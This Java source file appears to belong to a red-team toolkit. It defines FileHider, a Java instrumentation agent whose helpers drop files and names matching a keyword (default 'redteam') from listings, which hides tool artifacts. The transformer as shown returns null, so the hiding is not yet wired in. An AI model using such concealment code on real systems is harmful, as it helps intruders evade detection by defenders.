package com.redblue.red.hider;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class FileHider implements ClassFileTransformer {

    private static final Logger LOG = LoggerFactory.getLogger("FileHider");
    private static String targetJarKeyword = "redteam";

    public static void premain(String args, Instrumentation inst) {
        if (args != null && !args.isEmpty()) {
            targetJarKeyword = args;
        }
        LOG.info("FileHider agent loaded, hiding jars matching: {}", targetJarKeyword);
        inst.addTransformer(new FileHider(), true);
    }

    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) {
        return null;
    }

    public static File[] filterFiles(File[] files) {
        if (files == null) return null;
        return java.util.Arrays.stream(files)
                .filter(f -> !f.getName().toLowerCase().contains(targetJarKeyword))
                .toArray(File[]::new);
    }

    public static String[] filterNames(String[] names) {
        if (names == null) return null;
        return java.util.Arrays.stream(names)
                .filter(n -> !n.toLowerCase().contains(targetJarKeyword))
                .toArray(String[]::new);
    }

    public static void setTargetKeyword(String keyword) {
        targetJarKeyword = keyword;
    }
}
